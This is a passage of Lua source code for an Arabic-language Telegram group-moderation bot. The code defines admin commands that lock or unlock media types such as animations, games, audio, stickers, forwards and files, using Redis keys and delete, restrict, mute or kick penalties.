Redis:set(LaRiCa.."Lock:Animation"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل المتحركه").lockKick,"md",true)  
return false
end 
if text == "فتح المتحركه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Animation"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح المتحركه").unLock,"md",true)  
return false
end 
if text == "قفل الالعاب" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:geam"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الالعاب").Lock,"md",true)  
return false
end 
if text == "قفل الالعاب بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:geam"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الالعاب").lockKid,"md",true)  
return false
end 
if text == "قفل الالعاب بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:geam"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الالعاب").lockKtm,"md",true)  
return false
end 
if text == "قفل الالعاب بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:geam"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الالعاب").lockKick,"md",true)  
return false
end 
if text == "فتح الالعاب" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:geam"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الالعاب").unLock,"md",true)  
return false
end 
if text == "قفل الاغاني" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Audio"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الاغاني").Lock,"md",true)  
return false
end 
if text == "قفل الاغاني بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Audio"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الاغاني").lockKid,"md",true)  
return false
end 
if text == "قفل الاغاني بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Audio"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الاغاني").lockKtm,"md",true)  
return false
end 
if text == "قفل الاغاني بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Audio"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الاغاني").lockKick,"md",true)  
return false
end 
if text == "فتح الاغاني" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Audio"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الاغاني").unLock,"md",true)  
return false
end 
if text == "قفل الصوت" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:vico"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الصوت").Lock,"md",true)  
return false
end 
if text == "قفل الصوت بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:vico"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الصوت").lockKid,"md",true)  
return false
end 
if text == "قفل الصوت بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:vico"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الصوت").lockKtm,"md",true)  
return false
end 
if text == "قفل الصوت بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:vico"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الصوت").lockKick,"md",true)  
return false
end 
if text == "فتح الصوت" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:vico"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الصوت").unLock,"md",true)  
return false
end 
if text == "قفل الكيبورد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Keyboard"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الكيبورد").Lock,"md",true)  
return false
end 
if text == "قفل الكيبورد بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Keyboard"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الكيبورد").lockKid,"md",true)  
return false
end 
if text == "قفل الكيبورد بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Keyboard"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الكيبورد").lockKtm,"md",true)  
return false
end 
if text == "قفل الكيبورد بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Keyboard"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الكيبورد").lockKick,"md",true)  
return false
end 
if text == "فتح الكيبورد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Keyboard"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الكيبورد").unLock,"md",true)  
return false
end 
if text == "قفل الملصقات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Sticker"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الملصقات").Lock,"md",true)  
return false
end 
if text == "قفل الملصقات بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Sticker"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الملصقات").lockKid,"md",true)  
return false
end 
if text == "قفل الملصقات بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Sticker"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الملصقات").lockKtm,"md",true)  
return false
end 
if text == "قفل الملصقات بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Sticker"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الملصقات").lockKick,"md",true)  
return false
end 
if text == "فتح الملصقات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Sticker"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الملصقات").unLock,"md",true)  
return false
end 
if text == "قفل التوجيه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:forward"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التوجيه").Lock,"md",true)  
return false
end 
if text == "قفل التوجيه بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:forward"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التوجيه").lockKid,"md",true)  
return false
end 
if text == "قفل التوجيه بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:forward"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التوجيه").lockKtm,"md",true)  
return false
end 
if text == "قفل التوجيه بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:forward"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التوجيه").lockKick,"md",true)  
return false
end 
if text == "فتح التوجيه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:forward"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح التوجيه").unLock,"md",true)  
return false
end 
if text == "قفل الملفات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Document"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الملفات").Lock,"md",true)  
return false
end 
if text == "قفل الملفات بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Document"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الملفات").lockKid,"md",true)  
return false
end 
if text == "قفل الملفات بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Document"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الملفات").lockKtm,"md",true)  
return false
end 
if text == "قفل الملفات بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Document"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الملفات").lockKick,"md",true)  
return false
end 
if text == "فتح الملفات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Document"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الملفات").unLock,"md",true)  
return false
end 
if text == "قفل السيلفي" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Unsupported"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل السيلفي").Lock,"md",true)  
return false
end 
if text == "قفل السيلفي بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Unsupported"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل السيلفي").lockKid,"md",true)  
return false
end 
if text == "قفل السيلفي بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Unsupported"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل السيلفي").lockKtm,"md",true)  
return false
end 
if text == "قفل السيلفي بالطرد" then 
if not msg.Admin then
